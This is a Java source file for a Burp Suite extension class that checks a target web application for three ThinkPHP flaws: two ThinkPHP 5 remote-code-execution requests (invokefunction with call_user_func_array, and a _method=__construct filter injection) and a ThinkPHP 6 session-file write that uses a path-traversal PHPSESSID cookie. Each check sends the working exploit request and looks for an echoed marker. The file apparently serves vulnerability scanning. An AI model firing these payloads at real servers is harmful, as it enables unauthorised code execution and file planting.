package burp.Application;

import burp.*;

import java.io.PrintWriter;
import java.net.URL;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;

public class TPDetection {

    IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse baseRequestResponse;
    private IHttpRequestResponse newRequestResponse;
    private Boolean isVulExists = false;
    private String baseUrl;
    private String vulUrl;
    private PrintWriter stdout;


    public TPDetection(PrintWriter stdout, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IHttpRequestResponse baseRequestResponse, String baseUrl){
        this.stdout = stdout;
        this.callbacks = callbacks;
        this.helpers = helpers;
        this.baseRequestResponse = baseRequestResponse;
        this.baseUrl = baseUrl;
        this.run();
    }

    public void run(){
        String[] pocArray = new String[]{"Tp5ControllerRce", "Tp5MethodRce", "Tp6FileWrite"};
        int i = 0;
        do{
            getShell(pocArray[i]);
            ++i;
        }while (!isVulExists && i < pocArray.length);
    }

    public boolean IsVulExists(){
        return this.isVulExists;
    }

    public IHttpRequestResponse getHttpRequestResponse(){
        return this.baseRequestResponse;
    }

    public String GetVulUrl(){
        return this.vulUrl;
    }

    public void getShell(String pocName){
        if(pocName.equals("Tp5ControllerRce")){
            Tp5ControllerRce();
        }else if(pocName.equals("Tp5MethodRce")){
            Tp5MethodRce();
        }else if(pocName.equals("Tp6FileWrite")){
            Tp6FileWrite();
        }
    }
    public void Tp5ControllerRce(){
        try{
            String url = baseUrl + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=7a835ba0a9b4e430e8c8ec83f954b369";
            newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpRequest(new URL(url)));
            byte[] response = newRequestResponse.getResponse();
            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            byte[] requestBody = Arrays.copyOfRange(response, bodyOffset, response.length);
            String body = this.helpers.bytesToString(requestBody);
            if(body.contains("7a835ba0a9b4e430e8c8ec83f954b369")){
                this.isVulExists = true;
                this.vulUrl = url;
                baseRequestResponse = newRequestResponse;
            }
        }catch (Exception e){
            stdout.println(e);
        }
    }

    public void Tp5MethodRce(){
        try{
            String url = baseUrl + "/index.php?s=captcha";
            String data = "_method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=7a835ba0a9b4e430e8c8ec83f954b369&get[]=1";
            byte[] datas = data.getBytes();
            byte[] newRequest = helpers.buildHttpRequest(new URL(url));
            List<String> headers = helpers.analyzeRequest(newRequest).getHeaders();
            Collections.replaceAll(headers, headers.get(0), ((String)headers.get(0)).replace("GET", "POST"));
            Iterator var2 = headers.iterator();
            while(var2.hasNext()) {
                String header = (String)var2.next();
                if (header.contains("Content-Type")) {
                    headers.remove(header);
                    break;
                }
            }
            String contentType = "Content-Type: application/x-www-form-urlencoded";
            headers.add(contentType);
            newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpMessage(headers, datas));
            byte[] response = newRequestResponse.getResponse();
            int bodyOffset = helpers.analyzeResponse(response).getBodyOffset();
            byte[] requestBody = Arrays.copyOfRange(response, bodyOffset, response.length);
            String body = this.helpers.bytesToString(requestBody);
            if(body.contains("7a835ba0a9b4e430e8c8ec83f954b369")){
                this.isVulExists = true;
                this.vulUrl = url;
                baseRequestResponse = newRequestResponse;
            }
        }catch (Exception e){
            stdout.println(e);
        }
    }

    public void Tp6FileWrite(){
        try{
            String url = baseUrl + "/";
            byte[] newRequest = helpers.buildHttpRequest(new URL(url));
            List<String> headers = helpers.analyzeRequest(newRequest).getHeaders();
            Iterator var2 = headers.iterator();
            while(var2.hasNext()) {
                String header = (String)var2.next();
                if (header.contains("Cookie")) {
                    headers.remove(header);
                    break;
                }
            }
            String cookie = "Cookie: PHPSESSID=../../../../public/800380038.php";
            headers.add(cookie);
            newRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), helpers.buildHttpMessage(headers, null));
            byte[] response = newRequestResponse.getResponse();
            String respHeaders = helpers.analyzeResponse(response).getHeaders().toString();
            if (respHeaders.contains("Set-Cookie") && respHeaders.contains("800380038")){
                this.isVulExists = true;
                this.vulUrl = url;
                baseRequestResponse = newRequestResponse;
            }
        }catch (Exception e){
            stdout.println(e);
        }
    }
}
